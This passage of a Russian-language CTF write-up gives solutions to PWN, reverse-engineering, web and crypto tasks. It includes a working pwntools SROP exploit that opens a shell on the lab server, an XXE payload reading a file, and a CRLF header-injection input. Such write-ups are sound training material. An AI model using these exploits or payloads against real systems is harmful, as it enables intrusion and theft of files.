<li><a href="#NoSQL-injection" title="NoSQL injection:">NoSQL injection:</a></li>
</ul>
</li>
<li><a href="#Уязвимость-5" title="Уязвимость 5">Уязвимость 5</a></li>
<li><a href="#Уязвимость-6" title="Уязвимость 6">Уязвимость 6</a></li>
<li><a href="#WAF" title="WAF">WAF</a></li>
</ul>
</li>
<li><a href="#Вывод" title="Вывод">Вывод</a></li>
<li><a href="#Как-предотвратить-подобные-инциденты" title="Как предотвратить подобные инциденты?">Как предотвратить подобные инциденты?</a></li>
</ul>
</span></p><h1 id="Таски" data-id="Таски"><a class="anchor hidden-xs" href="#Таски" title="Таски"><span class="octicon octicon-link"></span></a><span>Таски</span></h1><h2 id="PWN-10" data-id="PWN-10"><a class="anchor hidden-xs" href="#PWN-10" title="PWN-10"><span class="octicon octicon-link"></span></a><span>PWN-10</span></h2><p><span>Для эксплуатации выдан elf файл. У файла отсутвуют такие защиты как стэковая канарейка, RELRO, NX, так же бинарник not PIE .В связи что бинарный файл максимально лишен излинего кода(нету никаких полезных гаджетов) и не линкуется ни с какими библиотеками обычный роп невозможен. Но можно заметить, что syscall read возвращает количество прочитанных байтов. Это дает нам возможность для такой техники как SROP. Мы используем SROP 2 раза: первый раз для того чтобы записать строку /bin/bash на стэк, второй раз чтобы вызвать execve с нужными параметрами. Пример эксплойта ниже.</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context.arch = <span class="hljs-string">'x86_64'</span>
<span class="hljs-comment"># p = gdb.debug('./micro', '''</span>
<span class="hljs-comment"># catch syscall execve</span>
<span class="hljs-comment"># c</span>
<span class="hljs-comment"># ''')</span>
p = remote(<span class="hljs-string">'10.10.19.10'</span>, <span class="hljs-number">8888</span>)
<span class="hljs-comment">#p = process('./micro')</span>
frame2 = SigreturnFrame()
frame2.rax = <span class="hljs-number">0x3b</span>  <span class="hljs-comment"># syscall number for execve</span>
frame2.rdi = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span>  <span class="hljs-comment"># pointer to /bin/sh</span>
frame2.rsi = <span class="hljs-number">0x0</span>  <span class="hljs-comment"># NULL</span>
frame2.rdx = <span class="hljs-number">0x0</span>  <span class="hljs-comment"># NULL</span>
frame2.rip = <span class="hljs-number">0x40102D</span>  <span class="hljs-comment"># syscall;ret</span>
frame2.rsp = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span> + <span class="hljs-number">32</span>
frame2.rbp = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span>

frame = SigreturnFrame()
frame.rax = <span class="hljs-number">0x0</span>  <span class="hljs-comment"># syscall number for read</span>
frame.rdi = <span class="hljs-number">0x0</span>  <span class="hljs-comment"># stdin</span>
frame.rsi = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span>  <span class="hljs-comment"># NULL</span>
frame.rdx = <span class="hljs-built_in">len</span>(<span class="hljs-string">b'/bin/sh'</span> + <span class="hljs-number">17</span> * <span class="hljs-string">b'R'</span> + p64(<span class="hljs-number">0x40101C</span>) + p64(<span class="hljs-number">0x40101C</span>)+ p64(<span class="hljs-number">0x40102d</span>) + <span class="hljs-built_in">bytes</span>(frame2) + p64(<span class="hljs-number">0x40102d</span>))  <span class="hljs-comment"># NULL</span>
frame.rip = <span class="hljs-number">0x40102D</span>  <span class="hljs-comment"># syscall; ret</span>
frame.rsp = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span> + <span class="hljs-number">32</span>
frame.rbp = <span class="hljs-number">0x402000</span> + <span class="hljs-number">128</span>


p.send(<span class="hljs-string">b'A'</span> * <span class="hljs-number">14</span> + <span class="hljs-string">b'/bin/sh'</span> + <span class="hljs-string">b'\x00'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0x401018</span>) + p64(<span class="hljs-number">0x40102D</span>) + <span class="hljs-built_in">bytes</span>(frame))
<span class="hljs-built_in">input</span>()
p.send(<span class="hljs-string">b'A'</span> * <span class="hljs-number">15</span>)
<span class="hljs-built_in">input</span>()
p.send(<span class="hljs-string">b'/bin/sh'</span> + <span class="hljs-number">17</span> * <span class="hljs-string">b'R'</span> + p64(<span class="hljs-number">0x40101C</span>) + p64(<span class="hljs-number">0x40101C</span>)+ p64(<span class="hljs-number">0x40102d</span>) + <span class="hljs-built_in">bytes</span>(frame2) + p64(<span class="hljs-number">0x40102d</span>))
<span class="hljs-built_in">input</span>(<span class="hljs-string">'LAST'</span>)
p.send(<span class="hljs-string">b'/bin/sh'</span> + <span class="hljs-string">b'\x00'</span> + <span class="hljs-string">b'U'</span>*<span class="hljs-number">7</span>)
p.interactive()
</div></div></code></pre><p><strong><span>FLAG:NTO{7h47_w45n7_50_b4d_w45_17}</span></strong></p><h2 id="Reverse-10" data-id="Reverse-10"><a class="anchor hidden-xs" href="#Reverse-10" title="Reverse-10"><span class="octicon octicon-link"></span></a><span>Reverse-10</span></h2><p><span>Для исследования нам выдан exe файл. Понимаем что она содержит dos программу.</span><br>
<span>Запустив программу понимаем что она просто печатает флаг, но переодично вызывает системное прерывание sleep(опкоды операции CD 15).</span><br>
<span>Патчим эти опкоды на nop(опкод 90) и получаем флаг после того как запускаем программу в досбоксе.</span><br>
<img src="https://i.imgur.com/uksn56f.png" alt="" loading="lazy"><br>
<strong><span>FLAG:nto{h3ll0_n3w_5ch00l_fr0m_0ld!!}</span></strong></p><h2 id="Reverse-20" data-id="Reverse-20"><a class="anchor hidden-xs" href="#Reverse-20" title="Reverse-20"><span class="octicon octicon-link"></span></a><span>Reverse-20</span></h2><p><span>В начале работы программы происходит перестановка символов в строке флага по какому-то алгоритму, можно сопоставить индексы символов исходных и перестановленных. Также происходит проверка len(flag)=28</span><br>
<span>Далее по строкам вида </span><code>/home/c3nt/Projects/Olymp_tasks/Old_Times/uni/unicorn/qemu/accel/tcg/cputlb.c</code><span> понимаем, что используется эмулятор CPU unicorn. Он имеет открытый исходный код. Используя github, </span><a href="https://unicorn.dpldocs.info" target="_blank" rel="noopener"><span>https://unicorn.dpldocs.info</span></a><span> и </span><a href="https://hackmd.io/@K-atc/rJTUtGwuW" target="_blank" rel="noopener"><span>https://hackmd.io/@K-atc/rJTUtGwuW</span></a><span> восстанавливаем логику работы кода:</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code">__int64 __fastcall checkShuffledFlag(__int64 KEy, _QWORD *flagstr)
{
  _QWORD *v2; // rax
  const char *v3; // rax
  _QWORD *v4; // rax
  _QWORD *v5; // rax
  __int64 result; // rax
  <span class="hljs-built_in">int</span> v7; // [rsp+10h] [rbp-20h] BYREF
  <span class="hljs-built_in">int</span> v8[<span class="hljs-number">2</span>]; // [rsp+14h] [rbp-1Ch] BYREF
  <span class="hljs-built_in">int</span> v9; // [rsp+1Ch] [rbp-14h]
  unsigned <span class="hljs-built_in">int</span> *uc; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int64 v11; // [rsp+28h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  v8[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;
  v9 = uc_open(3u, <span class="hljs-number">4</span>, &amp;uc);                     // UC_ARCH_MIPS=3u UC_MODE_LITTLE_ENDIAN 
                                                // UC_MODE_32 = <span class="hljs-number">4</span>
                                                // 
  <span class="hljs-keyword">if</span> ( v9 )
  {
    v2 = sub_1136000(4LL);
    *v2 = <span class="hljs-number">2</span>;
    sub_1137060(v2, &amp;off_168A080, 0LL);
  }
  v9 = uc_mem_map(uc, *(KEy + <span class="hljs-number">12</span>), 2097152LL, 7u);// uc_mem_map(uc, UC_BUG_WRITE_ADDR, size, UC_PROT_ALL)
  v9 = uc_mem_write(uc, *(KEy + <span class="hljs-number">12</span>), *KEy, *(KEy + <span class="hljs-number">8</span>));
  v7 = <span class="hljs-number">0</span>;
  v9 = setReg(uc, <span class="hljs-number">4</span>, &amp;v7);                      // v0 = <span class="hljs-number">0</span>
  v7 = <span class="hljs-number">0x2C2C2C2C</span>;
  v9 = setReg(uc, <span class="hljs-number">6</span>, &amp;v7);                      // a0 = <span class="hljs-number">0x2C2C2C2C</span>
  v7 = *extract4Chars(flagstr, 0LL);
  v9 = setReg(uc, <span class="hljs-number">11</span>, &amp;v7);                     // t1 = 4chars(<span class="hljs-number">0</span>)
  v7 = *extract4Chars(flagstr, 1LL);
  v9 = setReg(uc, <span class="hljs-number">12</span>, &amp;v7);                     // t2 = 4chars(<span class="hljs-number">1</span>)
  v7 = *extract4Chars(flagstr, 2LL);
  v9 = setReg(uc, <span class="hljs-number">13</span>, &amp;v7);                     // t3 = 4chars(<span class="hljs-number">2</span>)
  v7 = *extract4Chars(flagstr, 3LL);
  v9 = setReg(uc, <span class="hljs-number">14</span>, &amp;v7);                     // t4 = 4chars(<span class="hljs-number">3</span>)
  v7 = *extract4Chars(flagstr, 4LL);
  v9 = setReg(uc, <span class="hljs-number">15</span>, &amp;v7);                     // t5 = 4chars(<span class="hljs-number">4</span>)
  v7 = *extract4Chars(flagstr, 5LL);
  v9 = setReg(uc, <span class="hljs-number">16</span>, &amp;v7);
  v7 = *extract4Chars(flagstr, 6LL);            // t7 = 4chars()
  v9 = setReg(uc, <span class="hljs-number">17</span>, &amp;v7);
  v9 = uc_emu_start(uc, *(KEy + <span class="hljs-number">12</span>), (*(KEy + <span class="hljs-number">12</span>) + *(KEy + <span class="hljs-number">8</span>)), 0LL, -0uLL);
  <span class="hljs-keyword">if</span> ( v9 )
  {
    v3 = uc_strerror(v9);
    v4 = sub_11A9830(qword_17897C0, v3);
    sub_11A81D0(v4, sub_11A9150);
    v5 = sub_1136000(4LL);
    *v5 = <span class="hljs-number">2</span>;
    sub_1137060(v5, &amp;off_168A080, 0LL);
  }
  uc_reg_read(uc, <span class="hljs-number">5</span>, v8);                       // v1 reg
  uc_close(uc);
  result = v8[<span class="hljs-number">0</span>];
  <span class="hljs-keyword">if</span> ( v11 != __readfsqword(0x28u) )
    sub_1269330();
  <span class="hljs-keyword">return</span> result;
}
</div></div></code></pre><p><span>В этой функции назначаются регистры t1…t7 виртуального CPU MIPS (32 bit, little endian) байтами флага по 4 символа (4*8 = 32 бита). Дизассемблируем MIPS инструкции и портируем логику для решения с помощью SMT-солвера Z3. Стоит отметить, что из-за необратимости побитового AND есть масса вариантов флага, остаётся выбрать “нужный” (где есть логичные слова, а не рандомные символы). Для любого флага из приведённых ниже программа сообщит об успехе. Для фильтрации используем ограничение на печатаемые символы (достаём их из регистра с помощью &amp; и сдвига, напр </span><code>(reg &amp; 0xff000000) &gt;&gt; 24</code><span>), кроме того, мы знаем, что последний символ - </span><code>}</code><span>.</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">import</span> string


<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d1um} - correct, принято бордой</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d!Um} - бинарник их тоже примет</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d!ul}</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d!um}</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d8Um}</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d8ul}</span>
<span class="hljs-comment"># nto{Wh0_54id_Th1s_1S_M3d8um}</span>

<span class="hljs-comment"># b'nto{Wh0_54id_Th1s_1S_M3d0Qt}'</span>
<span class="hljs-comment"># b'nto{Wh0_54id_Th1s_1S_M3d0Qu}'</span>
<span class="hljs-comment"># b'nto{Wh0_54id_Th1s_1S_M3d1Pt}'</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">trans</span>(<span class="hljs-params">trmut</span>):
    forg = <span class="hljs-string">'{otndcbahgfe1lki54329876}qp0'</span>
    orig = <span class="hljs-string">'nto{abcdefghikl1234567890pq}'</span>

    res = [<span class="hljs-string">b' '</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(trmut))]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(forg)):
        res[orig.index(forg[i])] = trmut[i]
    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)


<span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *

t1, t2, t3, t4, t5, t6, t7 = [BitVec(<span class="hljs-string">f't<span class="hljs-subst">{i}</span>'</span>, <span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">7</span> + <span class="hljs-number">1</span>)]

s = Solver()
s.add(t1 == <span class="hljs-number">0x6e746f7b</span>)

t1 &amp;= <span class="hljs-number">0x2C2C2C2C</span>
s0 = <span class="hljs-number">0x2c24</span> &lt;&lt; <span class="hljs-number">16</span>
s0 = s0 | <span class="hljs-number">0x2c28</span>
s.add(s0 == t1)

t1 ^= t2
s0 = <span class="hljs-number">0x7b4c</span> &lt;&lt; <span class="hljs-number">16</span>
s0 = s0 | <span class="hljs-number">0x1c77</span>
s.add(s0 == t1)

t1 ^= t3
s0 = <span class="hljs-number">0x4e78</span> &lt;&lt; <span class="hljs-number">16</span>
s0 = s0 | <span class="hljs-number">0x7513</span>
s.add(s0 == t1)

args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t4 &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))
args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t4 &amp; <span class="hljs-number">0xff00</span>) &gt;&gt; <span class="hljs-number">8</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))
args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t4 &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))

args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_'</span>:
    args.append((t4 &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))

args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t7 &amp; <span class="hljs-number">0xff</span>) == <span class="hljs-number">125</span>)
s.add(Or(*args))
args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t7 &amp; <span class="hljs-number">0xff00</span>) &gt;&gt; <span class="hljs-number">8</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))
args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t7 &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))

args = []
<span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> string.ascii_letters + string.digits + <span class="hljs-string">'_!@+=-'</span>:
    args.append((t7 &amp; <span class="hljs-number">0xff000000</span>) &gt;&gt; <span class="hljs-number">24</span> == <span class="hljs-built_in">ord</span>(l))
s.add(Or(*args))

s.add(t4 == <span class="hljs-number">1599367217</span>)
t1 &amp;= t4
s0 = <span class="hljs-number">0x4e50</span> &lt;&lt; <span class="hljs-number">16</span>
s0 |= <span class="hljs-number">0x6011</span>
s.add(s0 == t1)

t1 ^= t5
s0 = <span class="hljs-number">0x3d0f</span> &lt;&lt; <span class="hljs-number">16</span>
s0 |= <span class="hljs-number">0x5142</span>
s.add(s0 == t1)

t1 ^= t6
s0 = <span class="hljs-number">0x6242</span> &lt;&lt; <span class="hljs-number">16</span>
s0 |= <span class="hljs-number">0x6226</span>
s.add(s0 == t1)

t1 &amp;= t7
s0 = <span class="hljs-number">0x2040</span> &lt;&lt; <span class="hljs-number">16</span>
s0 |= <span class="hljs-number">0x6024</span>

s.add(s0 == t1)
<span class="hljs-comment"># s.add(t4!=1599432793)</span>
<span class="hljs-comment"># s.add(t1==int.from_bytes(b'{otn', 'little'))</span>
<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
    s.check()
    m = s.model()
    <span class="hljs-comment"># print(m)</span>
    vr = <span class="hljs-built_in">sorted</span>([(d, <span class="hljs-built_in">int</span>(<span class="hljs-built_in">str</span>(m[d])).to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">'little'</span>)) <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> m], key=<span class="hljs-keyword">lambda</span> x: <span class="hljs-built_in">str</span>(x[<span class="hljs-number">0</span>]))
    <span class="hljs-comment"># print(vr)</span>
    s.add(t7 != <span class="hljs-built_in">int</span>.from_bytes(vr[-<span class="hljs-number">1</span>][<span class="hljs-number">1</span>], <span class="hljs-string">'little'</span>))
    bbb = <span class="hljs-string">b''</span>
    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> vr:
        bbb += v[<span class="hljs-number">1</span>]
    <span class="hljs-comment"># print(bbb)</span>
    <span class="hljs-built_in">print</span>(trans(bbb))
</div></div></code></pre><p><strong><span>FLAG:nto{Wh0_54id_Th1s_1S_M3d1um}</span></strong></p><h2 id="Web-10" data-id="Web-10"><a class="anchor hidden-xs" href="#Web-10" title="Web-10"><span class="octicon octicon-link"></span></a><span>Web-10</span></h2><p><span>Приложение общается по вебсокету с бэкендом. Внимание привлекает параметр format. Изменив его на xml, замечаем, что парсинг data происходит по другому, уже не как json, а как xml. Пытаемся закинуть XXE:</span></p><pre><code>encrypt(`{"format":"xml","data":"&lt;?xml version=\\"1.0\\" encoding=\\"UTF-8\\" ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM \\"file:///flag.txt\\" &gt;]&gt;&lt;root&gt;&lt;format&gt;xml&lt;/format&gt;&lt;data&gt;&lt;countries&gt;CPV&lt;/countries&gt;&lt;startdate&gt;0111-11-11&lt;/startdate&gt;&lt;enddate&gt;0011-11-11&lt;/enddate&gt;&lt;resttype&gt;&amp;xxe;&lt;/resttype&gt;&lt;/data&gt;&lt;/root&gt;"}`)
</code></pre><p><span>decrypted response c флагом:</span></p><pre><code>'{"format":"xml","data":"&lt;?xml version=\\"1.0\\" encoding=\\"UTF-8\\"?&gt;\\n&lt;!DOCTYPE netspi [\\n&lt;!ENTITY xxe SYSTEM \\"file:///flag.txt\\"&gt;\\n]&gt;\\n&lt;root&gt;\\n  &lt;format&gt;xml&lt;/format&gt;\\n  &lt;data&gt;\\n    &lt;countries&gt;CPV&lt;/countries&gt;\\n    &lt;startdate&gt;0111-11-11&lt;/startdate&gt;\\n    &lt;enddate&gt;0011-11-11&lt;/enddate&gt;\\n    &lt;resttype&gt;nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}\\n&lt;/resttype&gt;\\n    &lt;price&gt;NaN&lt;/price&gt;\\n  &lt;/data&gt;\\n&lt;/root&gt;\\n"}'
</code></pre><p><strong><span>FLAG: nto{w3bs0ck3ts_plu5_xx3_1s_l0v3}</span></strong></p><h2 id="Web-20" data-id="Web-20"><a class="anchor hidden-xs" href="#Web-20" title="Web-20"><span class="octicon octicon-link"></span></a><span>Web-20</span></h2><p><span>Изучив сурсы данных приложений, понимаем, что уязвимая часть - сырой сокет реквест. В попытках подменить какой-нибудь хедер и добиться ошибки, вставляем в юзернейм clrf байты - </span><strong><span>%0d%0</span></strong><span> и получаем ошибку с флагом.</span></p><pre><code>Bad Request Bare CR or LF found in header line "Cookie: username=aqe %0;flag=NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}" (generated by waitress)
</code></pre><p><strong><span>FLAG: NTO{request_smuggling_917a34072663f9c8beea3b45e8f129c5}</span></strong></p><h2 id="Crypto-10" data-id="Crypto-10"><a class="anchor hidden-xs" href="#Crypto-10" title="Crypto-10"><span class="octicon octicon-link"></span></a><span>Crypto-10</span></h2><p><span>В задаче идет простое преобразование байта в число. При этом, нет никакого ключа, поэтому мы просто строим соответствие и преобразовываем егог в обратную сторону.</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code">order = <span class="hljs-number">1337</span>
G = DihedralGroup(order)
padder = <span class="hljs-number">31337</span>
gen = G.gens()[<span class="hljs-number">0</span>]
all_gens = G.<span class="hljs-built_in">list</span>()

ct = [<span class="hljs-number">277</span>, <span class="hljs-number">92</span>, <span class="hljs-number">775</span>, <span class="hljs-number">480</span>, <span class="hljs-number">160</span>, <span class="hljs-number">92</span>, <span class="hljs-number">31</span>, <span class="hljs-number">586</span>, <span class="hljs-number">277</span>, <span class="hljs-number">801</span>, <span class="hljs-number">355</span>, <span class="hljs-number">489</span>, <span class="hljs-number">801</span>, <span class="hljs-number">31</span>, <span class="hljs-number">62</span>, <span class="hljs-number">926</span>, <span class="hljs-number">725</span>, <span class="hljs-number">489</span>, <span class="hljs-number">160</span>, <span class="hljs-number">92</span>, <span class="hljs-number">31</span>, <span class="hljs-number">586</span>, <span class="hljs-number">277</span>, <span class="hljs-number">801</span>, <span class="hljs-number">355</span>, <span class="hljs-number">489</span>, <span class="hljs-number">1281</span>, <span class="hljs-number">62</span>, <span class="hljs-number">801</span>, <span class="hljs-number">489</span>, <span class="hljs-number">1175</span>, <span class="hljs-number">277</span>, <span class="hljs-number">453</span>, <span class="hljs-number">489</span>, <span class="hljs-number">453</span>, <span class="hljs-number">348</span>, <span class="hljs-number">725</span>, <span class="hljs-number">31</span>, <span class="hljs-number">348</span>, <span class="hljs-number">864</span>, <span class="hljs-number">864</span>, <span class="hljs-number">348</span>, <span class="hljs-number">453</span>, <span class="hljs-number">489</span>, <span class="hljs-number">737</span>, <span class="hljs-number">288</span>, <span class="hljs-number">453</span>, <span class="hljs-number">489</span>, <span class="hljs-number">889</span>, <span class="hljs-number">804</span>, <span class="hljs-number">96</span>, <span class="hljs-number">489</span>, <span class="hljs-number">801</span>, <span class="hljs-number">721</span>, <span class="hljs-number">775</span>, <span class="hljs-number">926</span>, <span class="hljs-number">1281</span>, <span class="hljs-number">631</span>]


<span class="hljs-keyword">def</span> <span class="hljs-title function_">G_pow</span>(<span class="hljs-params">element, exponent</span>):
    element = G(element)
    answer = G(())
    aggregator = element
    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">int</span>(exponent))[<span class="hljs-number">2</span>:][::-<span class="hljs-number">1</span>]:
        <span class="hljs-keyword">if</span> bit == <span class="hljs-string">'1'</span>:
            answer *= aggregator
        aggregator *= aggregator
    <span class="hljs-keyword">return</span> answer


<span class="hljs-keyword">def</span> <span class="hljs-title function_">prepare</span>():
    result = <span class="hljs-built_in">dict</span>()
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):
        result[<span class="hljs-built_in">int</span>(all_gens.index(G_pow(gen, x * padder)))] = x
    <span class="hljs-keyword">return</span> result


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    prepared = prepare()
    pt = <span class="hljs-built_in">bytes</span>([prepared[x] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ct])
    <span class="hljs-built_in">print</span>(pt)
</div></div></code></pre><p><strong><span>FLAG: nto{5tr4ng3_gr0up_5tr4ng3_l0g_and_depressed_kid_zxc_ghoul}</span></strong></p><h1 id="tip1" data-id=""></h1><h2 id="Crypto-20" data-id="Crypto-20"><a class="anchor hidden-xs" href="#Crypto-20" title="Crypto-20"><span class="octicon octicon-link"></span></a><span>Crypto-20</span></h2><p><span>Сервис возвращает число в диапазоне от n//2 до n (n дано в условии), если запрошенный бит равен 0. Если он равен 1, выполняется операция возведения в степень с рандомным простым числом </span><code>getPrime(300)</code><span> и берётся остаток от деления на n. Суть решения в том, что остаток может быть меньше n // 2. Отправляем запрос 50 раз для каждого бита и если хотя бы один раз он меньше n //2 то бит=1, иначе 0.</span></p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span>
<span></span></div><div class="code"><span class="hljs-keyword">import</span> requests

NR = <span class="hljs-number">71461210178267241253874180572230672058943918462254505513262953236227938134718209678368057154590422202556893590227567700995975175246765502504256081853245470346336896040132899563871061059499515077101664144171770909013200423807024681526479725791286269762171575299819674488085699345704651404900889747484518347199</span> // <span class="hljs-number">2</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">GU</span>(<span class="hljs-params">b</span>):
    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
        z = requests.get(<span class="hljs-string">'http://10.10.19.10:1177/guess_bit?bit='</span>+<span class="hljs-built_in">str</span>(b))

        I = <span class="hljs-built_in">int</span>(z.json()[<span class="hljs-string">"guess"</span>])
        <span class="hljs-keyword">if</span> I &lt; (NR // <span class="hljs-number">2</span> - <span class="hljs-number">1</span>):
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">134</span>+<span class="hljs-number">1</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(GU(i)),end=<span class="hljs-string">''</span>)
